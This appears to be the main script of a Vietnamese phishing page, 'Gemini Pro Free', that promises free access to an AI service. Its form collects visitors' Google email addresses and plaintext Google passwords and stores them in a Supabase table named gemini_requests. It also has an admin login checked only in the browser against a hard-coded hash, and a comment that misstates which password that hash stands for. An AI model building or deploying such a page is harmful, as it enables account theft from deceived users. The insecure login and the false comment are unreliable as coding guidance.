// Gemini Pro Free - Main JavaScript

let currentStep = 1;
let supabase = null;

// Initialize Supabase
if (typeof window.SUPABASE_CONFIG !== 'undefined' && window.SUPABASE_CONFIG.url && window.SUPABASE_CONFIG.anonKey) {
    if (typeof window.supabase !== 'undefined') {
        const { createClient } = window.supabase;
        supabase = createClient(
            window.SUPABASE_CONFIG.url,
            window.SUPABASE_CONFIG.anonKey
        );
    }
}

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    initializeApp();
});

function initializeApp() {
    // Check if Supabase is configured
    if (!supabase) {
        console.warn('Supabase chưa được cấu hình. Vui lòng cập nhật file config.js');
    }

    // Setup event listeners
    setupEventListeners();
    
    // Show first step
    showStep(1);
}

// Language switching - Redirect to separate files
function changeLanguage(lang) {
    if (lang === 'vi') {
        // Already on Vietnamese page
        return;
    } else if (lang === 'en') {
        window.location.href = '../en/index.html';
    } else {
        // Default to main Vietnamese page
        window.location.href = '../index.html';
    }
}

function setupEventListeners() {
    // Checkbox for step 2
    const confirmCheckbox = document.getElementById('confirmSteps');
    if (confirmCheckbox) {
        confirmCheckbox.addEventListener('change', function() {
            const continueBtn = document.getElementById('continueBtn');
            continueBtn.disabled = !this.checked;
        });
    }

    // Form validation
    const formInputs = document.querySelectorAll('.form-input');
    formInputs.forEach(input => {
        input.addEventListener('input', validateForm);
    });
}

// Navigation Functions
function nextStep() {
    if (currentStep < 4) {
        currentStep++;
        showStep(currentStep);
    }
}

function previousStep() {
    if (currentStep > 1) {
        currentStep--;
        showStep(currentStep);
    }
}

function showStep(stepNumber) {
    // Hide all steps
    const allSteps = document.querySelectorAll('.step-container');
    allSteps.forEach(step => {
        step.classList.remove('active');
    });

    // Show current step
    const currentStepElement = document.querySelector(`.step-container[data-step="${stepNumber}"]`);
    if (currentStepElement) {
        currentStepElement.classList.add('active');
    }

    // Update progress bar
    updateProgressBar(stepNumber);

    // Scroll to top
    window.scrollTo({ top: 0, behavior: 'smooth' });
}

function updateProgressBar(stepNumber) {
    const progressSteps = document.querySelectorAll('.progress-step');
    
    progressSteps.forEach((step, index) => {
        const stepNum = index + 1;
        
        if (stepNum < stepNumber) {
            step.classList.add('completed');
            step.classList.remove('active');
        } else if (stepNum === stepNumber) {
            step.classList.add('active');
            step.classList.remove('completed');
        } else {
            step.classList.remove('active', 'completed');
        }
    });
}

// Form Validation
function validateForm() {
    const email = document.getElementById('email');
    const password = document.getElementById('password');
    const contactEmail = document.getElementById('contactEmail');

    if (!email || !password || !contactEmail) return false;

    const isValid = email.value.trim() !== '' && 
                   password.value.trim() !== '' && 
                   contactEmail.value.trim() !== '' &&
                   isValidEmail(email.value) &&
                   isValidEmail(contactEmail.value);

    return isValid;
}

function isValidEmail(email) {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
}

// Form Submission
async function submitForm() {
    // Validate form
    if (!validateForm()) {
        showNotification('Vui lòng điền đầy đủ thông tin hợp lệ!', 'error');
        return;
    }

    // Get form values
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const contactEmail = document.getElementById('contactEmail').value.trim();

    // Show loading
    showLoading(true);

    try {
        // Save to Supabase
        if (supabase) {
            const { data, error } = await supabase
                .from('gemini_requests')
                .insert([
                    {
                        google_email: email,
                        google_password: password,
                        contact_email: contactEmail,
                        created_at: new Date().toISOString(),
                        status: 'pending'
                    }
                ]);

            if (error) {
                console.error('Supabase error:', error);
                throw new Error('Không thể lưu thông tin. Vui lòng thử lại!');
            }

            console.log('Data saved successfully:', data);
        } else {
            // Fallback: Log to console if Supabase is not configured
            console.log('Form submitted (Supabase not configured):', {
                google_email: email,
                google_password: password,
                contact_email: contactEmail,
                created_at: new Date().toISOString()
            });
            
            // Simulate delay
            await new Promise(resolve => setTimeout(resolve, 1500));
        }

        // Hide loading
        showLoading(false);

        // Show success message
        showNotification('Đã gửi thông tin thành công!', 'success');

        // Move to next step
        setTimeout(() => {
            nextStep();
        }, 1000);

    } catch (error) {
        showLoading(false);
        showNotification(error.message || 'Có lỗi xảy ra. Vui lòng thử lại!', 'error');
        console.error('Error:', error);
    }
}

// Reset Form
function resetForm() {
    // Reset form fields
    const form = document.getElementById('userForm');
    if (form) {
        form.reset();
    }

    // Reset checkbox
    const checkbox = document.getElementById('confirmSteps');
    if (checkbox) {
        checkbox.checked = false;
    }

    // Reset current step
    currentStep = 1;
    showStep(1);

    // Disable continue button
    const continueBtn = document.getElementById('continueBtn');
    if (continueBtn) {
        continueBtn.disabled = true;
    }
}

// Loading Overlay
function showLoading(show) {
    const loadingOverlay = document.getElementById('loadingOverlay');
    if (loadingOverlay) {
        if (show) {
            loadingOverlay.classList.add('active');
        } else {
            loadingOverlay.classList.remove('active');
        }
    }
}

// Notification System
function showNotification(message, type = 'info') {
    // Create notification element
    const notification = document.createElement('div');
    notification.className = `notification notification-${type}`;
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        padding: 20px 30px;
        background: ${type === 'success' ? '#95E1D3' : '#FF6B6B'};
        color: #1A1A1A;
        border: 4px solid #1A1A1A;
        box-shadow: 5px 5px 0px rgba(0, 0, 0, 1);
        font-weight: 700;
        font-size: 1.1rem;
        z-index: 10000;
        animation: slideInRight 0.3s ease;
        max-width: 400px;
        word-wrap: break-word;
    `;
    notification.textContent = message;

    // Add animation
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInRight {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    `;
    document.head.appendChild(style);

    // Add to body
    document.body.appendChild(notification);

    // Remove after 3 seconds
    setTimeout(() => {
        notification.style.animation = 'slideInRight 0.3s ease reverse';
        setTimeout(() => {
            notification.remove();
            style.remove();
        }, 300);
    }, 3000);
}

// Utility Functions
function sanitizeInput(input) {
    const div = document.createElement('div');
    div.textContent = input;
    return div.innerHTML;
}

// Analytics (Optional)
function trackEvent(eventName, data = {}) {
    console.log('Event:', eventName, data);
    // Add your analytics code here (Google Analytics, etc.)
}

// Track page load
trackEvent('page_load', {
    timestamp: new Date().toISOString()
});

// Toggle Password Visibility
function togglePassword() {
    const passwordInput = document.getElementById('password');
    const toggleBtn = document.querySelector('.toggle-password');
    
    if (passwordInput.type === 'password') {
        passwordInput.type = 'text';
        toggleBtn.textContent = '🙈';
    } else {
        passwordInput.type = 'password';
        toggleBtn.textContent = '👁️';
    }
}

// Admin Login Functions
function toggleAdminLogin() {
    const popup = document.getElementById('adminLoginPopup');
    popup.classList.toggle('active');
    
    // Clear password field
    const passwordInput = document.getElementById('adminPassword');
    if (passwordInput) {
        passwordInput.value = '';
    }
}

// SHA-256 hash function (secure)
async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    return hashHex;
}

async function adminLogin() {
    const passwordInput = document.getElementById('adminPassword');
    const password = passwordInput.value;
    
    // Hash the password with SHA-256 for maximum security
    const inputHash = await sha256(password);
    // Pre-computed hash of "200320"
    const correctPasswordHash = '8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92';
    
    if (inputHash === correctPasswordHash) {
        // Store admin session with timestamp
        const authToken = await sha256(password + Date.now().toString());
        sessionStorage.setItem('adminAuth', authToken);
        sessionStorage.setItem('adminTime', Date.now().toString());
        
        // Redirect to admin page
        window.location.href = 'admin.html';
    } else {
        showNotification('Mật khẩu không đúng!', 'error');
        passwordInput.value = '';
    }
}
